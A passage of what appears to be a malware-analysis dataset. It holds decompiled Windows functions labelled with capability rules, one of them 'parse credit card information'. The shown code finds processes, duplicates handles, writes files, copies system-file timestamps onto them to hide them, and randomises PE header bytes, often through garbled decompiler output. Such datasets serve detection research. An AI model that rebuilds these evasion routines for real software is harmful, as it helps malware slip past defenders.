  fcn.00403290();\n    uStack16 = 0xd;\n    uStack20 = 0x410588;\n    uStack24 = 0xc;\n    puStack28 = 0x41f9c0;\n    uStack32 = 0x403ca2;\n    fcn.00403290();\n    uStack16 = 6;\n    uStack20 = 0x410598;\n    uStack24 = 0xc;\n    puStack28 = 0x41f9c0;\n    uStack32 = 0x403cc0;\n    fcn.00403290();\n    uStack16 = 5;\n    uStack20 = 0x4105a0;\n    uStack24 = 0xc;\n    puStack28 = 0x41f9c0;\n    uStack32 = 0x403cf0;\n    fcn.00403290();\n    uVar12 = 0;\n    cVar15 = ((unaff_EBX & 0xff00 | unaff_EBX | extraout_AH) & 0x94f) == 0;\n    do {\n        uStack20 = 0x4105a8;\n        uStack24 = 0xc;\n        uStack16 = 0x41f9c0;\n        uStack32 = 0x403d1c;\n        fcn.00403290();\n        if ((uVar12) || (!uVar12)) {\n            uStack32 = 0x19;\n            iVar3 = 0xc;\n            break;\n        }\n    } while (extraout_ECX_00 != 1 && cVar15 != '\\0');\n    *piVar9 = unaff_ESI + 4;\n    *(*0x9750e2b5 + -0x48) = (*(*0x9750e2b5 + -0x48) - unaff_EBP) - uVar12;\n    fcn.00403290(0x41f9c0, iVar3);\n    uStack16 = 0xf;\n    uStack20 = 0x4105d4;\n    uStack24 = 0xc;\n    puStack28 = 0x41f9c0;\n    uStack32 = 0x403d83;\n    fcn.00403290();\n    uVar13 = 0;\n    bVar11 = (POPCOUNT((extraout_CX - 1U & piVar9 | 0x61be) & 0xff) & 1U) == 0;\n    uStack16 = 0xe;\n    uStack20 = 0x4105e4;\n    uStack24 = 0xc;\n    puStack28 = 0x41f9c0;\n    uStack32 = 0x403da4;\n    uVar20 = fcn.00403290();\n    pcVar6 = uVar20 >> 0x20;\n    uVar4 = uVar20;\n    if (bVar11) {\ncode_r0x00403dbb:\n        puVar8 = 0x6ab8ec44;\n        uStack32 = 0xd;\n        iVar3 = 0xc;\n    }\n    else {\n        uStack32 = CONCAT22(0xec44, uStack32);\n        if (!bVar11) goto code_r0x00403dbb;\n        puVar8 = 0x6ab8ec48;\n        out(*0x6ab8ec44, uVar20 >> 0x20);\n        uVar13 = in_AF;\n        do {\n            cVar15 = uVar4 >> 8;\n            uVar13 = 9 < (uVar4 & 0xf) | uVar13;\n            uVar4 = CONCAT31(CONCAT21(uVar4 >> 0x10, cVar15 - uVar13), -uVar13);\n            in_AF = uVar13;\n        } while (uVar13 || cVar15 == *pcVar6);\n    }\n    piVar10 = piVar9 + pcVar6 * 2;\n    *piVar10 = (*piVar10 + 0x7b) - uVar13;\n    *(extraout_ECX_01 + 0x6a) = uVar4;\n    puVar1 = pcVar6 + 0xc;\n    uVar5 = extraout_ECX_01 >> 8;\n    uVar13 = CARRY1(*puVar1, uVar5);\n    *puVar1 = *puVar1 + uVar5;\n    bVar11 = (POPCOUNT(*puVar1) & 1U) == 0;\n    uVar20 = fcn.00403290(0x41f9c0, iVar3);\n    pcVar6 = uVar20 >> 0x20;\n    uVar4 = uVar20;\n    uVar7 = puVar8;\n    if ((!bVar11) && (bVar11)) {\n        uVar7 = uVar7 + 4;\n        out(*puVar8, uVar20 >> 0x20);\n        uVar13 = in_AF;\n        do {\n            cVar15 = uVar4 >> 8;\n            uVar13 = 9 < (uVar4 & 0xf) | uVar13;\n            uVar4 = CONCAT31(CONCAT21(uVar4 >> 0x10, cVar15 - uVar13), -uVar13);\n        } while (uVar13 || cVar15 == *pcVar6);\n    }\n    piVar10 = piVar9 + pcVar6 * 2;\n    *piVar10 = (*piVar10 + 0x7b) - uVar13;\n    *(extraout_ECX_02 + 0x6a) = uVar4;\n    pcVar6[0xc] = pcVar6[0xc] + (extraout_ECX_02 + 1 >> 8);\n    fcn.00403290(0x41f9c0);\n    uStack16 = 0xf;\n    uStack20 = 0x410610;\n    uStack24 = 0xc;\n    puStack28 = 0x41f9c0;\n    uStack32 = 0x403e29;\n    fcn.00403290();\n    uStack16 = 0xb;\n    uStack20 = 0x410620;\n    uStack24 = 0xc;\n    puStack28 = 0x41f9c0;\n    uStack32 = 0x403e4d;\n    fcn.00403290();\n    uVar12 = 0;\n    bVar11 = false;\n    uStack16 = 0xb;\n    uStack20 = 0x41062c;\n    uStack24 = 0xc;\n    puStack28 = 0x41f9c0;\n    uStack32 = 0x403e72;\n    fcn.00403290();\n    if ((!bVar11) && (bVar11)) {\n        *puStack28 = unaff_retaddr;\n        return CONCAT44(CONCAT22(uStack6, CONCAT11(uStack7, uStack8)), unaff_retaddr);\n    }\n    uStack32 = 0xb;\n    fcn.00403290(0x41f9c0, 0xc);\n    if ((!uVar12) && (uVar12)) {\n        unaff_EBX = unaff_EBX + *(unaff_EBX + 0x69 + extraout_EDX_00 * 4) + uVar12;\n    }\n    fcn.00403290(0x41f9c0, 0xc, 0x410644, 10);\n    uStack16 = 0xc;\n    uStack20 = 0x410650;\n    uStack24 = 0xc;\n    puStack28 = 0x41f9c0;\n    uStack32 = 0x403efa;\n    fcn.00403290();\n    uStack16 = 0xe;\n    uStack20 = 0x41065c;\n    uStack24 = 0xc;\n    puStack28 = 0x41f9c0;\n    uStack32 = 0x403f19;\n    uVar13 = fcn.00403290();\n    cVar18 = '\\0';\n    cVar15 = (uVar13 ^ 0xca) < '\\0';\n    uStack16 = 0x11;\n    uStack20 = 0x41066c;\n    uStack24 = 0xc;\n    puStack28 = 0x41f9c0;\n    uStack32 = 0x403f45;\n    iVar3 = fcn.00403290();\n    piVar10 = piVar9;\n    if ((cVar18 == cVar15) && (cVar18 != cVar15)) {\n        out(0xc4, iVar3);\n        piVar10 = piVar9 + 1;\n        *piVar9 = iVar3;\n    }\n    uStack32 = 0x13;\n    uVar20 = fcn.00403290(0x41f9c0, 0xc);\n    piVar9 = uVar20 >> 0x20;\n    *(uVar20 + -0x7ce92414) = extraout_ST0;\n    *piVar9 = *piVar9 + 0x146adf84;\n    fcn.00403290(0x41f9c0, 0xc, 0x410694, unaff_EBX);\n    uStack20 = 0x33;\n    uStack24 = 0x4106a8;\n    puStack28 = 0xc;\n    uStack32 = 0x41f9c0;\n    fcn.00403290();\n    cVar18 = '\\0';\n    cVar15 = (unaff_EBX + 1U ^ 0x50) < '\\0';\n    uStack20 = 10;\n    uStack24 = 0x4106dc;\n    puStack28 = 0xc;\n    uStack32 = 0x41f9c0;\n    fcn.00403290();\n    if ((cVar18 == cVar15) && (cVar18 != cVar15)) {\n        *((&stack0xffffffe0 ^ *(unaff_EBX + 0x6a)) - 4) = 0x40401f;\n        func_0x6a408125();\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    fcn.00403290(0x41f9c0, 0xc, 0x4106e8);\n    uStack20 = 5;\n    uStack24 = 0x4106ec;\n    puStack28 = 0xc;\n    uStack32 = 0x41f9c0;\n    fcn.00403290();\n    bVar11 = (POPCOUNT(((unaff_EBX ^ uVar7) >> 8) - 1U & 0xd) & 1U) == 0;\n    uStack20 = 6;\n    uStack24 = 0x4106f4;\n    puStack28 = 0xc;\n    uStack32 = 0x41f9c0;\n    fcn.00403290();\n    if ((!bVar11) && (bVar11)) {\n        puVar8 = &stack0xffffffdc;\n        cVar15 = '\\x1e';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar8 = puVar8 + -1;\n            *puVar8 = *unaff_EBP;\n            cVar15 = cVar15 + -1;\n        } while ('\\0' < cVar15);\n        uVar4 = in(0x78);\n        return CONCAT44(extraout_EDX_01, uVar4);\n    }\n    fcn.00403290(0x41f9c0, 0xc, 0x4106fc);\n    uVar12 = 0;\n    uVar19 = 0;\n    uVar16 = (unaff_EBX & 0x4d) == 0;\n    uStack20 = 0xc;\n    uStack24 = 0x410708;\n    puStack28 = 0xc;\n    uStack32 = 0x41f9c0;\n    fcn.00403290();\n    uVar22 = 0x410740;\n    uVar21 = 0xc;\n    uVar4 = 0x41f9c0;\n    fcn.00403290(0x41f9c0, 0xc, 0x410740);\n    if ((!uVar19) && (uVar19)) {\n        uVar19 = in(extraout_EDX_02);\n        *piVar10 = uVar19;\n        if (!uVar12 && !uVar16) goto code_r0x00404183;\n    }\n    *(extraout_EDX_02 + 0xc) = *(extraout_EDX_02 + 0xc) + (extraout_ECX_03 + 1 >> 8);\n    fcn.00403290(0x41f9c0);\n    fcn.00403290(0x41f9c0, 0xc, 0x4107c8, 0x41);\n    uStack16 = 0xc;\n    uStack20 = 0x41f9c0;\n    uStack24 = 0x404154;\n    fcn.00403290();\n    uStack24 = 0x4b;\n    puStack28 = 0x410840;\n    uStack32 = 0xc;\n    fcn.00403290();\n    uVar22 = 0x39;\n    uVar21 = 0x41088c;\n    fcn.00403290(0x41f9c0, 0xc, 0x41088c, 0x39);\n    uVar4 = 0xc;\ncode_r0x00404183:\n    fcn.00403290(0x41f9c0, uVar4, uVar21, uVar22);\n    uVar20 = fcn.00403290();\n    return uVar20;\n}\n",
        "token_count": 4824
    },
    "00401e10": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401e78) overlaps instruction at (ram,0x00401e77)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x00401e6a)\n// WARNING: Removing unreachable block (ram,0x00401e74)\n// WARNING: Removing unreachable block (ram,0x00401e78)\n\nuint __cdecl fcn.00401e10(uint arg_8h)\n\n{\n    bool bVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_108h;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    iVar3 = (**0x41f9dc)(2, 0);\n    if (iVar3 == -1) {\n        return 0xffffffff;\n    }\n    var_12ch = 0x128;\n    puVar6 = &var_128h;\n    for (iVar5 = 0x49; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    iVar5 = iVar3;\n    // WARNING: Bad instruction - Truncating control flow here\n    iVar4 = (**0x41f9e0)(iVar3, &var_12ch);\n    pcVar2 = _sym.imp.MSVCRT.dll__stricmp;\n    do {\n        bVar1 = iVar4 == 0;\n        if (bVar1) {\ncode_r0x00401edf:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n            return var_4h;\n        }\n        if ((!bVar1) && (bVar1)) {\n            iVar3 = iVar5;\n        }\n        iVar4 = (*pcVar2)(&var_108h, arg_8h);\n        if (iVar4 == 0) {\n            var_4h = var_124h;\n            goto code_r0x00401edf;\n        }\n        iVar4 = (**0x41f9e4)(iVar3, &var_12ch);\n    } while( true );\n}\n",
        "token_count": 522
    },
    "00401ef0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401f27) overlaps instruction at (ram,0x00401f25)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401ef0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint unaff_ESI;\n    int32_t unaff_EDI;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar2 = unaff_EDI;\n    uVar3 = unaff_ESI;\n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(arg_8h, 0);\n    if (iVar1 != -1) {\n        if ((iVar1 < -1) || (-2 < iVar1)) {\n            unaff_ESI = uVar3;\n            unaff_EDI = iVar2;\n        }\n        *(unaff_EDI + 0x5e) = *(unaff_EDI + 0x5e);\n        return unaff_ESI;\n    }\n    return 1;\n}\n",
        "token_count": 232
    },
    "004027a0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004027a0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.00401e10(0x410520);\n    if (iVar1 == -1) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x40, 0, iVar1);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(arg_8h, iVar1, 0, 0, 0, 2);\n    iVar3 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar2);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 210
    },
    "00402880": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004028e8) overlaps instruction at (ram,0x004028e7)\n// \n// WARNING: Removing unreachable block (ram,0x004028b4)\n// WARNING: Removing unreachable block (ram,0x004028be)\n\nuint __cdecl fcn.00402880(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint8_t *puVar1;\n    unkbyte6 Var2;\n    uint32_t arg_8h_00;\n    char *pcVar3;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t unaff_EBX;\n    char *unaff_EDI;\n    bool bVar6;\n    bool bVar7;\n    ulong uVar8;\n    uint32_t uVar9;\n    \n    arg_8h_00 = (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0x40000000, 1, 0, 2, 0x80, 0);\n    if (arg_8h_00 == 0xffffffff) {\n        return 0;\n    }\n    uVar9 = arg_8h_00;\n    uVar8 = (*_sym.imp.KERNEL32.dll_WriteFile)(arg_8h_00, arg_ch, arg_10h, &arg_8h, 0);\n    iVar5 = uVar8 >> 0x20;\n    bVar6 = (POPCOUNT(uVar8 & 0xff) & 1U) == 0;\n    if (uVar8 == 0) {\n        return 0;\n    }\n    iVar4 = extraout_ECX;\n    if ((bVar6) || (!bVar6)) {\n        bVar7 = false;\n        bVar6 = *0x41fa04 == 0;\n        if (!bVar6) {\n            uVar8 = fcn.004027a0(arg_8h_00);\n            iVar5 = uVar8 >> 0x20;\n            *0x41fa04 = -(uVar8 != 0);\n            bVar7 = SCARRY4(*0x41fa04, 1);\n            *0x41fa04 = *0x41fa04 + 1;\n            bVar6 = *0x41fa04 == 0;\n            iVar4 = extraout_ECX_00;\n        }\n        if (bVar6 || bVar7 != *0x41fa04 < 0) goto code_r0x00402914;\n    }\n    *(iVar4 + 0x41fa04) = *(iVar4 + 0x41fa04) & 0xffffff85;\n    *(unaff_EBX + 0x56 + iVar5) = 0;\n    Var2 = *(unaff_EDI + arg_8h_00 * 8);\n    pcVar3 = Var2;\n    puVar1 = pcVar3 + -0x5d;\n    *puVar1 = *puVar1 << 4 | *puVar1 >> 4;\n    *unaff_EDI = *unaff_EDI + iVar4 + '\\x01';\n    *pcVar3 = *pcVar3 + Var2;\n    *(arg_8h_00 + 0x56) = *(arg_8h_00 + 0x56) + (Var2 >> 8);\n    arg_8h_00 = arg_8h_00 & 0xffff0000 | uVar9 & 0xffff;\ncode_r0x00402914:\n    fcn.004037d0(0, arg_8h_00);\n    if (*0x41fa04 == 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(arg_8h_00);\n    }\n    return 1;\n}\n",
        "token_count": 856
    },
    "null": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "004035f0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403752) overlaps instruction at (ram,0x00403750)\n// \n// WARNING: Removing unreachable block (ram,0x00403752)\n// WARNING: Removing unreachable block (ram,0x0040373d)\n\nuint32_t __cdecl\nfcn.004035f0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch, uint arg_20h)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    uint32_t *puVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t extraout_ECX;\n    uint32_t uVar7;\n    int32_t unaff_EBX;\n    uint32_t unaff_ESI;\n    uint *puVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    ushort in_SS;\n    bool bVar12;\n    char in_AF;\n    char cStack848;\n    uint uStack847;\n    uchar uStack588;\n    uint uStack587;\n    uint uStack328;\n    uint uStack324;\n    int32_t iStack320;\n    uint uStack316;\n    uint uStack312;\n    ushort uVar13;\n    ushort uVar14;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    bVar12 = (POPCOUNT(&stack0xfffffef0 & 0xff) & 1U) == 0;\n    if ((!bVar12) && (bVar12)) {\n        puVar3 = segment(in_SS, *0x10 + -0x11c);\n        if (&stack0xfffffffc < 0x10c) {\n            pcVar4 = *puVar3 ^ 0x6e;\n            *pcVar4 = *pcVar4 + pcVar4;\n        }\n        else if (bVar12) {\n            uStack312 = 0x4035ce;\n            iVar5 = fcn.004031e0(0x80000002, 0x4106a8, 0x4106f4, &stack0xfffffeec, &stack0xfffffee8, *puVar3);\n            if ((iVar5 == 0) || (5 < unaff_ESI)) {\n                unaff_ESI = 0xffffffff;\n            }\n            return unaff_ESI;\n        }\n    }\n    fcn.00402e90();\n    fcn.00402e90();\n    bVar12 = SBORROW4(extraout_ECX, 0x5354);\n    fcn.00402e90();\n    if ((!bVar12) && (bVar12)) {\n        LOCK();\n    }\n    uStack312 = 0x20;\n    uStack316 = arg_14h;\n    iStack320 = arg_1ch;\n    uStack324 = arg_18h;\n    uStack328 = 0x4036d8;\n    fcn.00402e90();\n    uVar7 = &stack0xfffffffc & 0xffff0000 | *0x10 - 4;\n    iVar5 = fcn.004035a0();\n    if (iVar5 == -1) {\n        iVar5 = (*_sym.imp.MSVCRT.dll_rand)();\n        *(*(uVar7 + 0x20) + 0x120) = iVar5 % 5;\n    }\n    else {\n        *(*(uVar7 + 0x20) + 0x120) = iVar5;\n    }\n    *(uVar7 - 0x10c) = 0;\n    puVar8 = uVar7 - 0x10b;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    *(uVar7 - 4) = 0x104;\n    *(puVar8 + 2) = 0;\n    uStack312 = 0x403770;\n    uVar6 = fcn.004031e0(0x80000001, 0x410740, 0x41076c, uVar7 - 8, uVar7 - 0x10c, uVar7 - 4);\n    bVar12 = uVar6 != 0;\n    if (bVar12) {\n        if ((bVar12) && (!bVar12)) {\n            if (arg_1ch + 1 == 0) {\n                uVar13 = unaff_EBX;\n                uVar14 = unaff_EBX >> 0x10;\n                cStack848 = '\\0';\n                puVar8 = &stack0xfffffcb1;\n                for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n                *puVar8 = 0;\n                *(puVar8 + 2) = 0;\n                uStack588 = '\\0';\n                puVar8 = &stack0xfffffdb5;\n                for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n                *puVar8 = 0;\n                *(puVar8 + 2) = 0;\n                (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&stack0xfffffcb0, 0x104);\n                uVar7 = 0xffffffff;\n                pcVar4 = &stack0xfffffcb0;\n                do {\n                    pcVar9 = pcVar4;\n                    if (uVar7 == 0) break;\n                    uVar7 = uVar7 - 1;\n                    pcVar9 = pcVar4 + 1;\n                    cVar2 = *pcVar4;\n                    pcVar4 = pcVar9;\n                } while (cVar2 != '\\0');\n                uVar7 = ~uVar7;\n                puVar8 = pcVar9 + -uVar7;\n                puVar11 = &stack0xfffffdb4;\n                for (uVar6 = uVar7 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {\n                    *puVar11 = *puVar8;\n                    puVar8 = puVar8 + 1;\n                    puVar11 = puVar11 + 1;\n                }\n                for (uVar7 = uVar7 & 3; uVar7 != 0; uVar7 = uVar7 - 1) {\n                    *puVar11 = *puVar8;\n                    puVar8 = puVar8 + 1;\n                    puVar11 = puVar11 + 1;\n                }\n                uVar7 = 0xffffffff;\n                pcVar4 = 0x4104ec;\n                do {\n                    pcVar9 = pcVar4;\n                    if (uVar7 == 0) break;\n                    uVar7 = uVar7 - 1;\n                    pcVar9 = pcVar4 + 1;\n                    cVar2 = *pcVar4;\n                    pcVar4 = pcVar9;\n                } while (cVar2 != '\\0');\n                uVar7 = ~uVar7;\n                iVar5 = -1;\n                pcVar4 = &stack0xfffffdb4;\n                do {\n                    pcVar10 = pcVar4;\n                    if (iVar5 == 0) break;\n                    iVar5 = iVar5 + -1;\n                    pcVar10 = pcVar4 + 1;\n                    cVar2 = *pcVar4;\n                    pcVar4 = pcVar10;\n                } while (cVar2 != '\\0');\n                puVar8 = pcVar9 + -uVar7;\n                puVar11 = pcVar10 + -1;\n                for (uVar6 = uVar7 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {\n                    *puVar11 = *puVar8;\n                    puVar8 = puVar8 + 1;\n                    puVar11 = puVar11 + 1;\n                }\n                for (uVar7 = uVar7 & 3; uVar7 != 0; uVar7 = uVar7 - 1) {\n                    *puVar11 = *puVar8;\n                    puVar8 = puVar8 + 1;\n                    puVar11 = puVar11 + 1;\n                }\n                (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(&stack0xfffffdb4, 0, &stack0xfffffeb8);\n                if (unaff_EBX == -1) {\n                    iVar5 = fcn.004014e0(unaff_ESI);\n                    if (iVar5 == -1) {\n                        return 0;\n                    }\n                }\n                else {\n                    iVar5 = CONCAT22(uVar14, uVar13);\n                }\n                (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar5, &stack0xfffffebc, &stack0xfffffec4, &stack0xfffffecc);\n                if (unaff_EBX == -1) {\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar5);\n                }\n                return 1;\n            }\n            piVar1 = (CONCAT11(in_AF, in_AF * '\\x06') & 0xff0f) + 0x2a;\n            *piVar1 = *piVar1 - (arg_1ch + 1);\n        }\n        uVar6 = (*_sym.imp.MSVCRT.dll__stricmp)();\n        if (uVar6 == 0) {\n            uVar6 = *(uVar7 + 0x20);\n            *(uVar6 + 0x120) = *(uVar6 + 0x120) | 0x80;\n        }\n    }\n    return uVar6;\n}\n",
        "token_count": 2233
    },
    "004037d0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004037d0(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    char *pcVar7;\n    char *pcVar8;\n    uint *puVar9;\n    char lpBuffer;\n    uint var_22fh;\n    uchar var_12ch;\n    uint var_12bh;\n    uint var_28h;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    int32_t var_4h;\n    \n    var_4h = arg_ch;\n    lpBuffer = '\\0';\n    puVar5 = &var_22fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_12ch = '\\0';\n    puVar5 = &var_12bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    uVar3 = 0xffffffff;\n    pcVar7 = &lpBuffer;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = &var_12ch;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    uVar3 = 0xffffffff;\n    pcVar7 = 0x4104ec;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar7 = &var_12ch;\n    do {\n        pcVar8 = pcVar7;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar8 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar8;\n    } while (cVar1 != '\\0');\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = pcVar8 + -1;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(&var_12ch, 0, &var_28h);\n    iVar2 = var_4h;\n    if ((arg_ch == -1) && (iVar2 = fcn.004014e0(arg_8h),  iVar2 == -1)) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n    if (arg_ch == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1150
    },
    "004019c0": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401b87) overlaps instruction at (ram,0x00401b86)\n// \n// WARNING: Removing unreachable block (ram,0x00401b7d)\n\nuint __cdecl fcn.004019c0(uint16_t *arg_8h)\n\n{\n    uint16_t *puVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    uint *puVar7;\n    uint32_t var_4h;\n    \n    if (*arg_8h != 0x5a4d) {\n        return 0;\n    }\n    puVar1 = arg_8h;\n    if ((0x5a4d < *arg_8h) && (*arg_8h < 0x5a4e)) {\n        puVar1 = arg_8h & 0xe2f4cc58;\n    }\n    if (*(*(puVar1 + 0x1e) + puVar1) != 0x4550) {\n        return 0;\n    }\n    if ((*(puVar1 + 0x1e) + puVar1)[0x16] != 0) {\n        return 0;\n    }\n    var_4h = 0x40;\n    if (*(arg_8h + 0x1e) < 0x81) {\n        return 0;\n    }\n    if (*(arg_8h + 0x1e) < 0xc0) {\n        var_4h = *(arg_8h + 0x1e) - 0x80;\n    }\n    puVar2 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_(var_4h);\n    if (puVar2 == NULL) {\n        return 0;\n    }\n    uVar4 = 0;\n    if (var_4h != 0) {\n        do {\n            iVar3 = (*_sym.imp.MSVCRT.dll_rand)();\n            uVar5 = uVar4 + 1;\n            *(uVar4 + puVar2) = iVar3 % 0xff;\n            uVar4 = uVar5;\n        } while (uVar5 < var_4h);\n    }\n    puVar6 = puVar2;\n    puVar7 = arg_8h + 0x40;\n    for (uVar4 = var_4h >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar7 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    for (var_4h = var_4h & 3; var_4h != 0; var_4h = var_4h - 1) {\n        *puVar7 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    sub.MSVCRT.dll_void___cdecl_operator_delete_void__(puVar2);\n    return 1;\n}\n",
        "token_count": 700
    },
    "004041b0": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
